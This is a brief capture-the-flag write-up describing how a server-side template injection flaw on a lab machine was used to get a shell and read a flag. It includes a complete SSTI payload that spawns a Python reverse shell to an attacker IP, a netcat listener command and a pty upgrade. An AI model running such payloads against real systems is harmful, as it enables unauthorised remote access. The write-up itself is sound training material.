# Finding flag-1
The CTF machine produced by the .ova was inaccesssible due to unknown login credentials

# Finding IP/website 

# Reverse Shell
The website had an input field which was vulnerable to SSTI (server-side template Injection).
## Steps followed:
1. Netcat (In kali terminal):
```
nc -nvlp 4444
```
2. Exploited the SSTI vulnerability using simple python payload
```
{{ ''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['system']('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'') }}
```
where ```192.168.1.6``` is my kali machine's IP\
The above payload allowed to connect kali machine to the CTF machine

(Below is the Output in Kali terminal)
```
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.14] 58992
/bin/sh: 0: can't access tty; job control turned off
$
```
the tty is not accessed 
so we used pty in python to spawn into bin/bash
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then,we used the command ```ls``` to list all files in directory which gave...
```
www-data@ctf-machine:/opt/ssti-lab$ ls
app.py  F14@_0n3.txt  static  wget-log
```

And the command ```cat F14@_0n3.txt``` gave the flag
```
www-data@ctf-machine:/opt/ssti-lab$ cat F14@_0n3.txt
FLAG -> S3Cur1ty_Br3@k_P@55ed
```

```Flag: TCQ2025{S3Cur1ty_Br3@k_P@55ed}```
